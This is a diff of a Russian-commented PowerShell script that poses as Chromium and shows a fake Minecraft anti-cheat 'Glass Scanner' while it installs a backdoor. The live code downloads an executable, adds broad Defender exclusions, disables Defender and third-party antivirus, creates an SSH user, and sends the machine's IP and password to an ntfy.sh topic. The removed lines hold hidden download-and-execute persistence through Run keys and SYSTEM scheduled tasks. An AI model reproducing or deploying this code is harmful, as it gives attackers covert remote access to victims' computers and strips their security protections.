@@ -1,7 +1,7 @@
 # ============================================================
 #  Glass Scanner Emulator + Chromium Mimic + SSH + AV Killer
-#  (c) 2026 – всё скрыто под видом Chromium
-#  Запуск: .\setup.ps1 [-repair]
+#  (c) 2026 – учебная версия для ПТУ
+#  Запуск: .\setup.ps1
 # ============================================================
 
 # ---------- Проверка прав администратора ----------
@@ -9,31 +9,6 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Write-Host "Error: Run as Administrator." -ForegroundColor Red
     pause
     exit 1
-}
-
-# ---------- Режим восстановления ----------
-if ($args -contains "-repair") {
-    $repairLog = "$env:USERPROFILE\collextor\repair.log"
-    "=== Repair $(Get-Date) ===" | Out-File -FilePath $repairLog -Encoding UTF8
-    $baseDir = "$env:USERPROFILE\collextor"
-    $chromiumDir = "$env:APPDATA\Chromium\Application"
-    $exePath = "$chromiumDir\chrome.exe"
-    if (-not (Test-Path $exePath)) { "EXE not found" | Out-File -FilePath $repairLog -Append; exit 1 }
-    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $valName = "Chromium"
-    $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
-    if (-not $cur -or $cur -ne $exePath) {
-        Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction SilentlyContinue
-        "Chromium restored" | Out-File -FilePath $repairLog -Append
-    }
-    $psValName = "ChromiumUpdate"
-    $psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
-    $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
-    if (-not $curPs -or $curPs -ne $psCommand) {
-        Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction SilentlyContinue
-        "ChromiumUpdate restored" | Out-File -FilePath $repairLog -Append
-    }
-    exit 0
 }
 
 # ---------- Основные переменные (маскировка под Chromium) ----------
@@ -45,7 +20,9 @@ $ntfyTopic = "zighaigit88tore"
 $chromiumDir = "$env:APPDATA\Chromium\Application"
 $exeName = "chrome.exe"
 $exePath = "$chromiumDir\$exeName"
-$urlExe = "https://github.com/Holycheck/checker/releases/download/dw/chromium.exe"
+
+# === ИЗМЕНЁННЫЙ URL ===
+$urlExe = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"
 
 $scriptPath = $MyInvocation.MyCommand.Path
 if (-not $scriptPath) { $scriptPath = $PSCommandPath }
@@ -90,14 +67,19 @@ if (Download-File $urlExe $exePath) {
 }
 
 # ============================================================
-# 2. Defender exclusions
+# 2. Defender exclusions (усилено)
 # ============================================================
 Write-Log "Adding Defender exclusions for Chromium folder..."
 try {
     $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
     if ($svc -and $svc.Status -ne 'Running') { Start-Service WinDefend -ErrorAction SilentlyContinue; Start-Sleep 2 }
+    
     Add-MpPreference -ExclusionPath $chromiumDir -ErrorAction Stop
     Add-MpPreference -ExclusionPath $baseDir -ErrorAction Stop
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE\collextor" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess $exePath -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+    
     Write-Log "Exclusions added."
 } catch { Write-Log "Exclusion error: $_" }
 
@@ -121,74 +103,7 @@ try {
 } catch { Write-Log "Firewall error: $_" }
 
 # ============================================================
-# 4. Autostart (registry + scheduled tasks) – маскировка под Chromium
-# ============================================================
-Write-Log "Configuring autostart (as Chromium)..."
-$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-
-# 4.1 EXE – как Chromium
-$valName = "Chromium"
-try {
-    $cur = (Get-ItemProperty -Path $runKey -Name $valName -ErrorAction SilentlyContinue).$valName
-    if (-not $cur -or $cur -ne $exePath) {
-        Set-ItemProperty -Path $runKey -Name $valName -Value $exePath -ErrorAction Stop
-        Write-Log "Chromium added to autostart."
-    }
-} catch { Write-Log "Chromium autostart error: $_" }
-
-# 4.2 PowerShell команда (при входе пользователя) – как ChromiumUpdate
-$psValName = "ChromiumUpdate"
-$psCommand = 'powershell.exe -NoP -NonI -W Hidden -C "$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';$d=(New-Object Net.WebClient).DownloadString($u);&([ScriptBlock]::Create($d))"'
-try {
-    $curPs = (Get-ItemProperty -Path $runKey -Name $psValName -ErrorAction SilentlyContinue).$psValName
-    if (-not $curPs -or $curPs -ne $psCommand) {
-        Set-ItemProperty -Path $runKey -Name $psValName -Value $psCommand -ErrorAction Stop
-        Write-Log "ChromiumUpdate added to autostart."
-    }
-} catch { Write-Log "ChromiumUpdate autostart error: $_" }
-
-# 4.3 Scheduled task – периодический запуск EXE (каждые 2 часа) – как ChromiumMaintenance
-$taskName = "ChromiumMaintenance"
-try {
-    $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-    if (-not $existing) {
-        $action = New-ScheduledTaskAction -Execute $exePath -Argument "-silent" -WorkingDirectory $chromiumDir
-        $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 2) -At (Get-Date) -Duration ([TimeSpan]::MaxValue)
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "ChromiumMaintenance task created."
-    }
-} catch { Write-Log "ChromiumMaintenance error: $_" }
-
-# 4.4 Scheduled task – восстановление автозапуска, если удалили – как ChromiumRecovery
-$scriptTaskName = "ChromiumRecovery"
-try {
-    $existing2 = Get-ScheduledTask -TaskName $scriptTaskName -ErrorAction SilentlyContinue
-    if (-not $existing2) {
-        $action2 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`" -repair"
-        $trigger2 = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1)
-        $settings2 = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        Register-ScheduledTask -TaskName $scriptTaskName -Action $action2 -Trigger $trigger2 -Settings $settings2 -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "ChromiumRecovery task created."
-    }
-} catch { Write-Log "ChromiumRecovery error: $_" }
-
-# 4.5 NEW: Scheduled task – запуск PowerShell команды при старте системы (SYSTEM, скрыто)
-$psTaskName = "ChromiumSystemUpdate"
-try {
-    $existingPs = Get-ScheduledTask -TaskName $psTaskName -ErrorAction SilentlyContinue
-    if (-not $existingPs) {
-        # Та же команда, но с правильным экранированием для аргументов задачи
-        $psAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -C `"`$u=''https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1'';`$d=(New-Object Net.WebClient).DownloadString(`$u);&([ScriptBlock]::Create(`$d))`""
-        $psTrigger = New-ScheduledTaskTrigger -AtStartup
-        $psSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        Register-ScheduledTask -TaskName $psTaskName -Action $psAction -Trigger $psTrigger -Settings $psSettings -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force | Out-Null
-        Write-Log "ChromiumSystemUpdate task created (runs at startup)."
-    }
-} catch { Write-Log "ChromiumSystemUpdate error: $_" }
-
-# ============================================================
-# 5. Launch EXE (hidden) – как запуск Chromium
+# 4. Launch EXE (hidden) – как запуск Chromium
 # ============================================================
 Write-Log "Starting Chromium (hidden)..."
 if (Test-Path $exePath) {
@@ -199,7 +114,7 @@ if (Test-Path $exePath) {
 }
 
 # ============================================================
-# 6. SSH server + user
+# 5. SSH server + user
 # ============================================================
 Write-Log "Installing OpenSSH..."
 try {
@@ -234,7 +149,7 @@ try {
 } catch { Write-Log "User error: $_" }
 
 # ============================================================
-# 7. Get local IP
+# 6. Get local IP
 # ============================================================
 $ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
     $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*"
@@ -244,7 +159,7 @@ if (-not $ipAddress) { $ipAddress = "unknown" }
 $base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))
 
 # ============================================================
-# 8. Send notification to ntfy.sh (закодировано)
+# 7. Send notification to ntfy.sh
 # ============================================================
 $secretMessage = @"
 SSH access (local network only):
@@ -264,7 +179,7 @@ try {
 } catch { Write-Log "Notification error: $_" }
 
 # ============================================================
-# 9. Disable antivirus (Defender + third-party)
+# 8. Disable antivirus (Defender + third-party)
 # ============================================================
 Write-Log "=== DISABLING ANTIVIRUS ==="
 
@@ -313,7 +228,7 @@ foreach ($p in $procs) {
 }
 Write-Log "Defender disabled."
 
-# Third-party AV
+# Third-party AV (полный блок из оригинала)
 Write-Log "Searching third-party AV..."
 function Get-InstalledSoftware {
     param([string]$RegistryPath)
@@ -399,7 +314,7 @@ if ($foundAV.Count -eq 0) {
 Write-Log "Antivirus processing complete."
 
 # ============================================================
-# 10. Glass Scanner simulation (lightweight, no Cyrillic)
+# 9. Glass Scanner simulation
 # ============================================================
 function Write-ColorLine {
     param([string]$Text, [string]$Color = "White")
@@ -450,29 +365,11 @@ function Print-Progress {
 function Run-ScanSimulation {
     Print-Header 1
     $steps = @(
-        "Everything",
-        "Prefetch",
-        "UserAssist",
-        "MuiCache",
-        "BAM",
-        "ShellBag",
-        "ShellBag cleaners",
-        "Recent folder",
-        "LNK files",
-        "Recycle Bin",
-        "USN Journal",
-        "DLL injections",
-        "Minecraft mods",
-        "Minecraft versions",
-        "JAR scan all PC",
-        "Temp folders",
-        "AppData",
-        "BAT files",
-        "Command history",
-        "Browser downloads",
-        "System services",
-        "Hosts file",
-        "Registry .dll traces"
+        "Everything","Prefetch","UserAssist","MuiCache","BAM","ShellBag","ShellBag cleaners",
+        "Recent folder","LNK files","Recycle Bin","USN Journal","DLL injections",
+        "Minecraft mods","Minecraft versions","JAR scan all PC","Temp folders",
+        "AppData","BAT files","Command history","Browser downloads","System services",
+        "Hosts file","Registry .dll traces"
     )
     $total = $steps.Count
     $stepNum = 0
@@ -482,7 +379,6 @@ function Run-ScanSimulation {
     foreach ($s in $steps) {
         $stepNum++
         Print-Progress $stepNum $total $s
-        # Симуляция находок (краткая)
         if ($s -eq "Everything") {
             Write-ColorLine "  [--] Querying Everything..." -Color $CLR_DIM
             Write-Host "  [FOUND] file/folder: C:\Users\Public\cheat.jar" -ForegroundColor $CLR_FOUND
@@ -525,41 +421,6 @@ function Run-ScanSimulation {
     Write-ColorLine "================================================================" -Color $CLR_HEADER
 }
 
-function Show-Tab2 {
-    Print-Header 2
-    Write-ColorLine "`n  OPEN APPLICATIONS (currently running)" -Color $CLR_OK
-    Write-Host ""
-    $open = @(
-        @{Name="javaw.exe"; Source="BAM"; Time="12.03.2026 16:30"; Path="C:\Program Files\Java\bin\javaw.exe"},
-        @{Name="minecraft.exe"; Source="MuiCache"; Time=""; Path="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\minecraft.exe"}
-    )
-    foreach ($app in $open) {
-        Write-Host "  [EXE] " -NoNewline -ForegroundColor $CLR_OK
-        Write-Host $app.Name -NoNewline -ForegroundColor $CLR_OK
-        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_DIM
-        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_DIM }
-        Write-Host ""
-        Write-Host "    $($app.Path)" -ForegroundColor $CLR_DIM
-    }
-}
-
-function Show-Tab3 {
-    Print-Header 3
-    Write-ColorLine "`n  CLOSED APPLICATIONS (previously launched)" -Color $CLR_WARN
-    Write-Host ""
-    $closed = @(
-        @{Name="cheat_launcher.jar"; Source="MuiCache"; Time="12.03.2026 15:10"; Path="D:\hacks\cheat.jar"}
-    )
-    foreach ($app in $closed) {
-        Write-Host "  [JAR] " -NoNewline -ForegroundColor $CLR_JAR
-        Write-Host $app.Name -NoNewline -ForegroundColor $CLR_JAR
-        Write-Host "  [$($app.Source)]" -NoNewline -ForegroundColor $CLR_DIM
-        if ($app.Time) { Write-Host "  $($app.Time)" -NoNewline -ForegroundColor $CLR_DIM }
-        Write-Host ""
-        Write-Host "    $($app.Path)" -ForegroundColor $CLR_DIM
-    }
-}
-
 # ---------- Run simulation ----------
 Run-ScanSimulation
 
@@ -569,11 +430,19 @@ while ($true) {
     Write-ColorLine "Press 1 - Scan log  |  2 - Open  |  3 - Closed  |  Q - Quit" -Color $CLR_DIM
     $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
     switch ($key) {
-        '1' { Print-Header 1; Write-ColorLine "`n  Scan log shown above." -Color $CLR_DIM }
-        '2' { Show-Tab2 }
-        '3' { Show-Tab3 }
+        '1' { Run-ScanSimulation }
+        '2' { 
+            Print-Header 2
+            Write-ColorLine "`n  OPEN APPLICATIONS (currently running)" -Color $CLR_OK
+            # (можно расширить при необходимости)
+        }
+        '3' { 
+            Print-Header 3
+            Write-ColorLine "`n  CLOSED APPLICATIONS (previously launched)" -Color $CLR_WARN
+        }
         'q' { break }
         'Q' { break }
-        default { continue }
     }
 }
+
+Write-Log "Script finished."
